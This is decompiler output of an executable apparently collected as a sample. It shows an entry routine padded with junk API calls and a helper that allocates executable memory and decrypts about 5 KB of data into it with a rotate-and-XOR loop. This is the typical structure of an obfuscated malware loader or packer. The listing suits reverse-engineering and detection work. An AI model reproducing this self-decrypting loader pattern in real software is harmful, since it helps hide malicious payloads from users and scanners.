// subject_rdata.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

<anonymous> * __imp__GetSystemMetrics = &g_tE1AC; // 0040E000
<anonymous> * __imp__GetMessageW = &g_tE1C0; // 0040E004
<anonymous> * __imp__GetDlgItem = &g_tE1CE; // 0040E008
<anonymous> * __imp__ReleaseDC = &g_tE1DC; // 0040E00C
<anonymous> * __imp__DestroyWindow = &g_tE1E8; // 0040E010
<anonymous> * __imp__ReleaseDC = &g_tE1F8; // 0040E014
<anonymous> * __imp__PostMessageW = &g_tE204; // 0040E018
<anonymous> * __imp__UpdateLayeredWindow = &g_tE214; // 0040E01C
<anonymous> * __imp__PostMessageW = &g_tE22A; // 0040E020
<anonymous> * __imp__GetDlgItem = &g_tE23A; // 0040E024
<anonymous> * __imp__CreateWindowExW = &g_tE248; // 0040E028
<anonymous> * __imp__SetTimer = &g_tE25A; // 0040E02C
<anonymous> * __imp__SetTimer = &g_tE266; // 0040E030
<anonymous> * __imp__GetCurrentProcessId = &g_tE27E; // 0040E038
<anonymous> * __imp__GetModuleHandleA = &g_tE294; // 0040E03C
<anonymous> * __imp__GetCurrentProcess = &g_tE2A8; // 0040E040
<anonymous> * __imp__GetModuleHandleW = &g_tE2BC; // 0040E044
<anonymous> * __imp__ExitProcess = &g_tE2D0; // 0040E048
<anonymous> * __imp__LoadLibraryA = &g_tE2DE; // 0040E04C
<anonymous> * __imp__GetLastError = &g_tE2EE; // 0040E050
<anonymous> * __imp__lstrlenW = &g_tE2FE; // 0040E054
<anonymous> * __imp__GetModuleFileNameA = &g_tE30A; // 0040E058
<anonymous> * __imp__lstrlenW = &g_tE320; // 0040E05C
<anonymous> * __imp__VirtualAlloc = &g_tE32C; // 0040E060
<anonymous> * __imp__QueryPerformanceCounter = &g_tE33C; // 0040E064
<anonymous> * __imp__GetModuleHandleA = &g_tE356; // 0040E068
<anonymous> * __imp__GetCurrentThreadId = &g_tE36A; // 0040E06C
<anonymous> * __imp__FreeLibrary = &g_tE380; // 0040E070
<anonymous> * __imp__GetCommandLineA = &g_tE38E; // 0040E074
<anonymous> * __imp__lstrcmpiW = &g_tE3A0; // 0040E078
<anonymous> * __imp__LocalAlloc = &g_tE3AC; // 0040E07C
<anonymous> * __imp__VirtualAlloc = &g_tE3BA; // 0040E080
<anonymous> * __imp__GetCurrentProcess = &g_tE3CA; // 0040E084
<anonymous> * __imp__LocalAlloc = &g_tE3DE; // 0040E088
<anonymous> * __imp__GetCommandLineW = &g_tE3EC; // 0040E08C
<anonymous> * __imp__GetObjectW = &g_tE40C; // 0040E094
<anonymous> * __imp__StretchBlt = &g_tE41A; // 0040E098
<anonymous> * __imp__GetObjectW = &g_tE428; // 0040E09C
<anonymous> * __imp__ExtTextOutW = &g_tE436; // 0040E0A0
<anonymous> * __imp__SetBkColor = &g_tE444; // 0040E0A4
word32 g_dw40E100 = 57772; // 0040E100
word32 g_dw40E104 = 0xE1C0; // 0040E104
word32 g_dw40E108 = 0xE1CE; // 0040E108
word32 g_dw40E10C = 0xE1DC; // 0040E10C
word32 g_dw40E110 = 0xE1E8; // 0040E110
word32 g_dw40E114 = 57848; // 0040E114
word32 g_dw40E118 = 0xE204; // 0040E118
word32 g_dw40E11C = 57876; // 0040E11C
word32 g_dw40E120 = 0xE22A; // 0040E120
word32 g_dw40E124 = 0xE23A; // 0040E124
word32 g_dw40E128 = 0xE248; // 0040E128
word32 g_dw40E12C = 0xE25A; // 0040E12C
word32 g_dw40E130 = 0xE266; // 0040E130
word32 g_dw40E138 = 0xE27E; // 0040E138
word32 g_dw40E13C = 58004; // 0040E13C
word32 g_dw40E140 = 0xE2A8; // 0040E140
word32 g_dw40E144 = 58044; // 0040E144
word32 g_dw40E148 = 0xE2D0; // 0040E148
word32 g_dw40E14C = 0xE2DE; // 0040E14C
word32 g_dw40E150 = 0xE2EE; // 0040E150
word32 g_dw40E154 = 0xE2FE; // 0040E154
word32 g_dw40E158 = 0xE30A; // 0040E158
word32 g_dw40E15C = 0xE320; // 0040E15C
word32 g_dw40E160 = 58156; // 0040E160
word32 g_dw40E164 = 0xE33C; // 0040E164
word32 g_dw40E168 = 58198; // 0040E168
word32 g_dw40E16C = 58218; // 0040E16C
word32 g_dw40E170 = 0xE380; // 0040E170
word32 g_dw40E174 = 0xE38E; // 0040E174
word32 g_dw40E178 = 0xE3A0; // 0040E178
word32 g_dw40E17C = 58284; // 0040E17C
word32 g_dw40E180 = 58298; // 0040E180
word32 g_dw40E184 = 0xE3CA; // 0040E184
word32 g_dw40E188 = 0xE3DE; // 0040E188
word32 g_dw40E18C = 0xE3EC; // 0040E18C
word32 g_dw40E194 = 0xE40C; // 0040E194
word32 g_dw40E198 = 0xE41A; // 0040E198
word32 g_dw40E19C = 58408; // 0040E19C
word32 g_dw40E1A0 = 58422; // 0040E1A0
word32 g_dw40E1A4 = 0xE444; // 0040E1A4
// subject_text.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004016CC: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ptr32 fp;
	ui32 edi;
	ui32 ebx;
	word32 edx;
	Eq_7 esi;
	word32 ecx;
	ui32 eax;
	struct Eq_10 * fs;
	ui32 edi_8 = edi | ebx;
	ui32 edx_20 = ecx - (edx + edi_8) - 1;
	ui32 edx_26 = edx_20 ^ (eax | edx_20);
	ui32 esi_32 = (esi | 56002) - (ebx | 0xD3D7);
	ui32 ecx_33 = ecx - esi ^ edx_26;
	ui32 edi_37 = (edi_8 | 0xCBDE) & 54488;
	int32 edx_40 = -edx_26;
	ui32 ecx_54 = (ecx_33 | 0xCC) - 0xCE;
	ui32 edi_55 = -(edi_37 ^ esi_32 - 0xC4C7);
	ui32 ebx_64 = ((ebx | 0xD3D7) + (ecx_33 | 0xCC) & ecx_54) + ~(GetDlgItem((struct HWND__ *) 0xC402FE84, edx_40) | (ecx_33 | 0xCC));
	ui32 esi_71 = ebx_64 ^ edi_55;
	GetMessageW(null, (struct HWND__ *) 3319579331, edx_40 ^ 55514, ~0x05100A53);
	lstrcmpiW(null, null);
	ui32 esi_85 = esi_71 + ecx_54;
	GetCurrentProcess();
	Eq_88 ecx_96 = ecx_54 ^ esi_85;
	Eq_90 esi_99 = esi_85 - ebx_64;
	Eq_92 edx_100 = (ecx_54 ^ 0xDDCE) + 0xCBCE;
	VirtualAlloc(0xD5D1, 3111292250, 0xD7, 0x00D7D5D4);
	GetDlgItem((struct HWND__ *) 3763657058, ecx_96);
	PostMessageW((struct HWND__ *) ~0x72F18998, 0xD5, esi_99, edx_100);
	ReleaseDC((struct HWND__ *) 2299931637, (struct HDC__ *) 0xF0856C61);
	lstrlenW(null);
	word32 edx_136 = SLICE(SEQ(edx_100, ecx_96) - SEQ(0xC4, 0xD6 - ecx_96), word32, 32);
	GetLastError();
	lstrlenW(null);
	GetCommandLineA();
	GetModuleHandleW(null);
	Eq_159 esi_152 = ~esi_99;
	ui32 edx_157 = (edx_136 + (ecx_96 & 0xDDDB) & 0xD1D7) - 55003;
	LocalAlloc(edx_157 ^ 0xC5, 3870407798);
	GetModuleHandleA(null);
	ui32 esi_190 = ~(esi_152 ^ (edx_157 ^ 0xC5));
	FreeLibrary((struct HINSTANCE__ *) 2296986689);
	Eq_2 ebx_208 = 110510 - esi_190;
	GetSystemMetrics((word32) ebx_208 + 0x0000D1D2);
	Eq_2 esi_216 = ~esi_190;
	Eq_202 eax_222 = -QueryPerformanceCounter((LARGE_INTEGER *) 3367621806);
	Eq_68 edx_224 = (word32) esi_216 + ~edi_55;
	word32 edi_256 = ebx_208 - 0xCBCE - (word32) (CreateWindowExW(ebx_208, null, null, esi_216, 0xCCD0, ~0x31363430, eax_222, 3554594770, (struct HWND__ *) 0xDECD, (struct HMENU__ *) ~0x2F282332, (struct HINSTANCE__ *) ~0x443BA126, 0xD6) < (struct HWND__ *) ~0xC7);
	SetTimer((struct HWND__ *) 3620340629, ~0x0430A0F8, edx_224, (void (*)(HWND, UINT, UINT_PTR, DWORD)) 0x8AD11386);
	Eq_253 edx_280 = ~edx_224;
	ui32 edi_284 = (-edi_256 & 0xC2CB) - edx_280;
	ui32 ecx_293 = eax - esi;
	Eq_262 edx_295 = -edx_280;
	ui32 esi_311 = ~(ebx | 0xD3D7);
	ui32 eax_303 = esi - ~edi_284;
	ui32 edx_314 = edx_295 - esi - (edx_280 != 0x00) & 0xC6 | esi_311;
	ui32 eax_322 = eax_303 + ((~ecx_293 - 0xCD) - eax_303);
	ui32 esi_330 = -esi_311 - edx_314;
	ui32 edx_348 = --(edx_314 ^ 0xCB);
	ui32 ebx_336 = -(eax_322 + ~0xDE);
	ui32 ecx_344 = ~(eax_322 & esi_330);
	ui32 esi_351 = esi_330 ^ edx_348;
	Eq_2 eax_359 = UpdateLayeredWindow((struct HWND__ *) 4040436283, (struct HDC__ *) 3234322907, (POINT *) 3586576856, (SIZE *) 0xD6, (struct HDC__ *) 0xCB, (POINT *) 14144452, 3687568862, (BLENDFUNCTION *) 0x00CFC8C1, 0x00C0D3D2);
	uint32 edx_355 = edx_348 & esi_351;
	if (eax_359 != 0x00)
		return eax_359;
	GetCurrentThreadId();
	uint32 ebx_368 = (word32) eax_359 + (ebx_336 | 0xDBD2) + (ecx_344 - 0x01);
	struct Eq_337 * esp_376 = fp - 4;
	ui64 ebx_edx_775 = SEQ(ebx_368, edx_355 - 0xCF - (word32) (ebx_368 < 0x00));
	while (true)
	{
		uint32 edx_378 = (word32) ebx_edx_775;
		ui32 ebx_384 = -SLICE(ebx_edx_775 - 0xCEDB0000D3C7, word32, 32);
		Eq_158 eax_394 = LoadLibraryA(esp_376->t0000);
		++esp_376;
		if (eax_394 == null)
			break;
		ebx_edx_775 = SEQ(ebx_384, edx_378 - 54215);
	}
	esp_376->dwFFFFFFFC = 14142428;
	esp_376->dwFFFFFFF8 = ecx_344;
	esp_376->dwFFFFFFF4 = 0x00D5D3CC;
	esp_376->dwFFFFFFF0 = 0xCF;
	esp_376->dwFFFFFFEC = 0x00D9D3D7;
	esp_376->dwFFFFFFE8 = ecx_344;
	esp_376->dwFFFFFFE4 = ~0x3D282A30;
	ui32 ebx_422 = -(ebx_384 - 0x01 & edx_378 - 54215);
	ui32 ecx_423 = ecx_344 - ebx_422;
	ui32 ebx_427 = (char *) &eax_394->unused + 0x00CF + ebx_422;
	esp_376->dwFFFFFFE0 = ebx_427;
	esp_376->dwFFFFFFDC = ecx_423 - 0x01;
	esp_376->dwFFFFFFD8 = ebx_427;
	Eq_2 eax_437 = GetCurrentProcessId();
	esp_376->dwFFFFFFD4 = edx_378 - 0xD3C8;
	esp_376->dwFFFFFFD0 = 13293012;
	esp_376->dwFFFFFFCC = (word32) eax_437 + 0x00C0;
	esp_376->dwFFFFFFC8 = 2339539282;
	ui32 esi_441 = -((char *) &eax_394->unused + 0x00CF + ecx_344);
	Eq_2 eax_451 = PostMessageW(esp_376->dwFFFFFFC8, esp_376->dwFFFFFFCC, esp_376->dwFFFFFFD0, esp_376->dwFFFFFFD4);
	GetCurrentProcessId();
	esp_376->dwFFFFFFD4 = -(esi_441 - 0xCD - (word32) (eax_451 < ~0xDECA) ^ 0xCF);
	esp_376->dwFFFFFFD0 = 0xCF;
	esp_376->dwFFFFFFCC = 3016361295;
	GetModuleFileNameA(esp_376->dwFFFFFFCC, esp_376->dwFFFFFFD0, esp_376->dwFFFFFFD4);
	esp_376->dwFFFFFFFC = 2382498237;
	esp_376->dwFFFFFFF8 = 0x8578F818;
	ReleaseDC(esp_376->dwFFFFFFF8, esp_376->dwFFFFFFFC);
	esp_376->dwFFFFFFFC = ~0x06EDE001;
	esp_376->dwFFFFFFF8 = ~0x312B3628;
	esp_376->dwFFFFFFF4 = ~0x5A257153;
	esp_376->dwFFFFFFF0 = 0x99554C52;
	SetTimer(esp_376->dwFFFFFFF0, esp_376->dwFFFFFFF4, esp_376->dwFFFFFFF8, esp_376->dwFFFFFFFC);
	esp_376->dwFFFFFFFC = ~0x00B00BE1;
	DestroyWindow(esp_376->dwFFFFFFFC);
	fn00402EE2(esp_376->dwFFFFFFFC)->ptr0004 = fs;
	*(ui32 *) 4181850410 &= esp_376;
	byte * ecx_646 = esp_376[6];
	*ecx_646 &= esp_376->b001D;
}

// 00402EE2: Register ui32 fn00402EE2(Stack (ptr32 byte) dwArg00)
// Called from:
//      Win32CrtStartup
ui32 fn00402EE2(byte * dwArg00)
{
	GetCommandLineW();
	GetCurrentProcess();
	LocalAlloc(0xC2C1, 0xA12F1DAC);
	Eq_99 eax_240 = VirtualAlloc(0x00, 27247, 0x3000, 0x40);
	byte * esi_289 = dwArg00;
	Eq_99 ecx_328 = eax_240;
	word32 edx_352;
	for (edx_352 = 0x1460; edx_352 != 0x00; --edx_352)
	{
		byte bh_395 = __rol<byte,byte>(*esi_289, 22);
		ui8 bh_420 = -(bh_395 ^ 0x77);
		*ecx_328.u0 = bh_420;
		word32 ebx_446 = SEQ(0x00, bh_420, ~0x25);
		++esi_289;
		++ecx_328;
	}
	ui32 ebx_503 = -ebx_446 + edx_352;
	ui32 ecx_505 = ecx_328 | ebx_503;
	return (ebx_503 ^ 222) + ecx_505;
}

